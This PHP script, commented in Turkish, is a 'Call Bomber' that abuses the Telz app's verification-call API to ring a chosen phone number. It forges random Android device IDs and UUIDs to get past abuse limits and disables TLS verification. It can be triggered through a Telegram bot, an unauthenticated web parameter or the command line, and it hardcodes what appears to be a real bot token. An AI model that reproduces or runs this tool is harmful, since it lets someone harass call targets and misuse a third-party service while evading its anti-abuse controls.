<?php
/**
 * Ritalin Tool Call Bomber - DEBUG VERSION
 * Telz API detaylı analiz ve hata ayıklama
 */

// ==================== KONFIGÜRASYON ====================
define('MODE', 'TEST_RANDOM_IDS');
define('GOKU', 300);
define('BASE_URL', 'https://api.telz.com/');
define('USER_AGENT', 'Telz-Android/17.5.33');
define('APP_VERSION', '17.5.33');
define('OS', 'android');
define('OS_VERSION', '15');
define('LOOP_INTERVAL', 20);
define('MAX_RUNS', 0);

// ==================== TELEGRAM BOT KONFIG ====================
define('BOT_TOKEN', '8894652888:AAEjzcwqynhFBwoHjwhuGX9vmQnTBGBs61g');
define('WEBHOOK_URL', 'https://freeapiservice-q08q.onrender.com/arama.php');
define('ADMIN_CHAT_ID', '');

// ==================== FONKSİYONLAR ====================

function randomAndroidId() {
    return bin2hex(random_bytes(8));
}

function randomDeviceName() {
    $brands = ['Pixel', 'Xiaomi', 'Samsung', 'OnePlus', 'Moto'];
    return $brands[array_rand($brands)] . '-' . substr(bin2hex(random_bytes(3)), 0, 6);
}

function generateUUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

/**
 * Detaylı API isteği - Tüm yanıtı loglar
 */
function telzRequestDebug($endpoint, $payload, $androidId = null, $uuid = null) {
    if (MODE === 'TEST_RANDOM_IDS' && $androidId === null) {
        $androidId = randomAndroidId();
    }
    if ($uuid === null) $uuid = generateUUID();
    
    $payload['android_id'] = $androidId ?? '13e50e93a6399e67';
    $payload['app_version'] = APP_VERSION;
    $payload['os'] = OS;
    $payload['os_version'] = OS_VERSION;
    $payload['ts'] = (int)(microtime(true) * 1000);
    $payload['uuid'] = $uuid;
    
    $jsonPayload = json_encode($payload);
    
    // 1. İstek detaylarını logla
    $logData = "\n" . str_repeat("=", 60) . "\n";
    $logData .= "📤 [REQUEST] $endpoint\n";
    $logData .= "📦 PAYLOAD: " . $jsonPayload . "\n";
    $logData .= "🆔 Android ID: " . ($payload['android_id'] ?? 'null') . "\n";
    $logData .= "🔑 UUID: " . ($payload['uuid'] ?? 'null') . "\n";
    
    $ch = curl_init(BASE_URL . $endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonPayload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: ' . USER_AGENT,
        'Accept-Encoding: gzip',
        'Content-Type: application/json; charset=UTF-8',
        'Accept: application/json'
    ]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_HEADER, true); // Header'ları da al
    
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $totalTime = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
    $error = curl_error($ch);
    curl_close($ch);
    
    // Header ve body'yi ayır
    $headers = substr($response, 0, $headerSize);
    $body = substr($response, $headerSize);
    
    // 2. Yanıt detaylarını logla
    $logData .= "\n📥 [RESPONSE] $endpoint\n";
    $logData .= "📊 HTTP Status: $httpCode\n";
    $logData .= "⏱️ Süre: " . number_format($totalTime, 3) . "s\n";
    $logData .= "📋 HEADERS:\n$headers\n";
    $logData .= "📄 BODY: " . substr($body, 0, 2000) . (strlen($body) > 2000 ? "\n... (devamı kesildi)" : "") . "\n";
    
    // 3. JSON parse et
    $decoded = json_decode($body, true);
    if ($decoded !== null) {
        $logData .= "✅ JSON PARSE BAŞARILI\n";
        $logData .= "🔍 PARSED DATA: " . json_encode($decoded, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
    } else {
        $logData .= "❌ JSON PARSE HATASI!\n";
        $logData .= "RAW: " . substr($body, 0, 500) . "\n";
    }
    
    $logData .= str_repeat("=", 60) . "\n";
    
    // Log dosyasına yaz
    file_put_contents('telz_debug.log', $logData, FILE_APPEND);
    
    // Ayrıca ekrana da yaz (CLI için)
    if (php_sapi_name() === 'cli') {
        echo $logData;
    }
    
    if ($httpCode === 429) {
        throw new Exception("Fazla deneme! Retry-After kontrol edin.");
    }
    if ($httpCode >= 400) {
        throw new Exception("HTTP Hata: $httpCode - " . substr($body, 0, 200));
    }
    if ($error) {
        throw new Exception("CURL Hatası: $error");
    }
    
    return $decoded ?? $body;
}

function sendCallDebug($phone) {
    $logStart = "\n" . str_repeat("🚀", 30) . "\n";
    $logStart .= "📞 ARAMA BAŞLATILIYOR: $phone\n";
    $logStart .= "⏰ Zaman: " . date('Y-m-d H:i:s') . "\n";
    $logStart .= str_repeat("🚀", 30) . "\n";
    file_put_contents('telz_debug.log', $logStart, FILE_APPEND);
    
    try {
        $androidId = randomAndroidId();
        $uuid = generateUUID();
        $deviceName = (MODE === 'TEST_RANDOM_IDS') ? randomDeviceName() : 'Xiaomi 2311DRK48G';
        
        // 1. auth_list
        $result = telzRequestDebug('app/auth_list', ['event' => 'auth_list'], $androidId, $uuid);
        
        // 2. run
        $result = telzRequestDebug('app/run', [
            'event' => 'run',
            'device_name' => $deviceName,
            'ipv4_address' => '10.1.10.1',
            'ipv6_address' => 'FE80::1',
            'lang' => 'tr',
            'network_country' => 'tr',
            'network_type' => '4G',
            'roaming' => 'no',
            'root' => 'no',
            'run_id' => '',
            'sim_country' => 'tr'
        ], $androidId, $uuid);
        
        // 3. stat_btns
        $result = telzRequestDebug('app/stat_btns', [
            'event' => 'stat_btns',
            'btn' => 'on_reg_continue'
        ], $androidId, $uuid);
        
        // 4. validate_phonenumber
        $result = telzRequestDebug('app/validate_phonenumber', [
            'event' => 'validate_phonenumber',
            'phone' => $phone,
            'region' => 'TR'
        ], $androidId, $uuid);
        
        // 5. auth_call - ASIL ARAMA
        $result = telzRequestDebug('app/auth_call', [
            'event' => 'auth_call',
            'phone' => $phone,
            'attempt' => '0',
            'lang' => 'tr'
        ], $androidId, $uuid);
        
        // Detaylı sonuç analizi
        $logResult = "\n" . str_repeat("📊", 30) . "\n";
        $logResult .= "🔍 SONUÇ ANALİZİ:\n";
        $logResult .= "STATUS: " . ($result['status'] ?? 'YOK') . "\n";
        $logResult .= "REASON: " . ($result['reason'] ?? 'YOK') . "\n";
        $logResult .= "TAM YANIT: " . json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
        $logResult .= str_repeat("📊", 30) . "\n";
        file_put_contents('telz_debug.log', $logResult, FILE_APPEND);
        
        if (isset($result['status']) && $result['status'] === 'ok') {
            return ['success' => true, 'message' => "✅ Arama gönderildi: $phone", 'debug' => $result];
        } else {
            $error = $result['reason'] ?? json_encode($result) ?? 'Bilinmeyen';
            return ['success' => false, 'message' => "❌ Hata: $error", 'debug' => $result];
        }
        
    } catch (Exception $e) {
        $logError = "\n" . str_repeat("❌", 30) . "\n";
        $logError .= "🚨 EXCEPTION: " . $e->getMessage() . "\n";
        $logError .= "📄 TRACE: " . $e->getTraceAsString() . "\n";
        $logError .= str_repeat("❌", 30) . "\n";
        file_put_contents('telz_debug.log', $logError, FILE_APPEND);
        
        return ['success' => false, 'message' => "❌ Hata: " . $e->getMessage()];
    }
}

// ==================== TELEGRAM BOT MESAJ GÖNDER ====================
function sendTelegramMessage($chatId, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'HTML'];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

// ==================== WEBHOOK KURULUMU ====================
if (isset($_GET['setwebhook'])) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook?url=" . urlencode(WEBHOOK_URL);
    $result = file_get_contents($url);
    echo "Webhook Kurulum Sonucu:\n";
    echo $result;
    exit;
}

// ==================== WEBHOOK (Telegram Bot) ====================
if (php_sapi_name() !== 'cli') {
    $content = file_get_contents('php://input');
    $update = json_decode($content, true);
    
    // Debug: Gelen update'i logla
    file_put_contents('telz_debug.log', "\n📨 WEBHOOK UPDATE: " . json_encode($update, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND);
    
    // Webhook set etme
    if (isset($_GET['setwebhook'])) {
        $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook?url=" . urlencode(WEBHOOK_URL);
        $result = file_get_contents($url);
        echo $result;
        exit;
    }
    
    // Log dosyasını görüntüle
    if (isset($_GET['log'])) {
        header('Content-Type: text/plain; charset=utf-8');
        if (file_exists('telz_debug.log')) {
            echo file_get_contents('telz_debug.log');
        } else {
            echo "Log dosyası bulunamadı.";
        }
        exit;
    }
    
    // Log dosyasını temizle
    if (isset($_GET['clearlog'])) {
        file_put_contents('telz_debug.log', '');
        echo "Log temizlendi.";
        exit;
    }
    
    // Bot komutlarını işle
    if ($update && isset($update['message'])) {
        $chatId = $update['message']['chat']['id'];
        $text = $update['message']['text'] ?? '';
        $fromId = $update['message']['from']['id'] ?? '';
        
        // Sadece admin
        if ($chatId != ADMIN_CHAT_ID) {
            sendTelegramMessage($chatId, "⛔ Yetkiniz yok.");
            exit;
        }
        
        // /start
        if ($text === '/start') {
            sendTelegramMessage($chatId, "📞 <b>Call Bomber DEBUG</b>\n\n"
                . "Komutlar:\n"
                . "/call +90568533894 - Arama gönder (debug)\n"
                . "/log - Log dosyasını göster\n"
                . "/clearlog - Log'u temizle\n"
                . "/status - Bot durumu");
            exit;
        }
        
        // /log
        if ($text === '/log') {
            if (file_exists('telz_debug.log')) {
                $log = file_get_contents('telz_debug.log');
                $log = substr($log, -4000); // Son 4000 karakter
                sendTelegramMessage($chatId, "<pre>" . htmlspecialchars($log) . "</pre>");
            } else {
                sendTelegramMessage($chatId, "Log dosyası yok.");
            }
            exit;
        }
        
        // /clearlog
        if ($text === '/clearlog') {
            file_put_contents('telz_debug.log', '');
            sendTelegramMessage($chatId, "✅ Log temizlendi.");
            exit;
        }
        
        // /call
        if (strpos($text, '/call ') === 0) {
            $phone = trim(substr($text, 6));
            if (empty($phone)) {
                sendTelegramMessage($chatId, "❌ Numara girin: /call +90");
                exit;
            }
            
            sendTelegramMessage($chatId, "⏳ Arama gönderiliyor: $phone...\n📝 Log: " . WEBHOOK_URL . "?log");
            $result = sendCallDebug($phone);
            sendTelegramMessage($chatId, $result['message']);
            exit;
        }
        
        // /status
        if ($text === '/status') {
            sendTelegramMessage($chatId, "✅ Bot aktif (DEBUG MODE)\nMODE: " . MODE . "\nLOOP: " . LOOP_INTERVAL . "s\n📝 Log: " . WEBHOOK_URL . "?log");
            exit;
        }
        
        sendTelegramMessage($chatId, "❌ Bilinmeyen komut. /start");
    }
    
    // Normal HTTP isteği
    $phone = $_GET['phone'] ?? $_POST['phone'] ?? null;
    if ($phone) {
        $result = sendCallDebug($phone);
        header('Content-Type: application/json');
        echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        exit;
    }
    
    echo json_encode(['status' => 'ok', 'message' => 'Call Bomber DEBUG Aktif', 'log' => WEBHOOK_URL . '?log']);
    exit;
}

// ==================== CLI BOT MODU ====================
if (php_sapi_name() === 'cli') {
    echo "\n========================================\n";
    echo "  📞 CALL BOMBER - DEBUG MODE\n";
    echo "========================================\n";
    echo "  MODE: " . MODE . "\n";
    echo "  LOOP_INTERVAL: " . LOOP_INTERVAL . "s\n";
    echo "  📝 Log: telz_debug.log\n";
    echo "========================================\n\n";
    
    $phone = readline("Numara gir (+90xx): ");
    $phone = trim($phone);
    
    if (empty($phone)) {
        echo "❌ Numara girilmedi.\n";
        exit(1);
    }
    
    echo "\n🚀 Debug başlatılıyor...\n";
    echo "📝 Log dosyasını izlemek için: tail -f telz_debug.log\n\n";
    
    $result = sendCallDebug($phone);
    echo "\n" . str_repeat("=", 60) . "\n";
    echo "📊 SONUÇ: " . $result['message'] . "\n";
    echo str_repeat("=", 60) . "\n";
}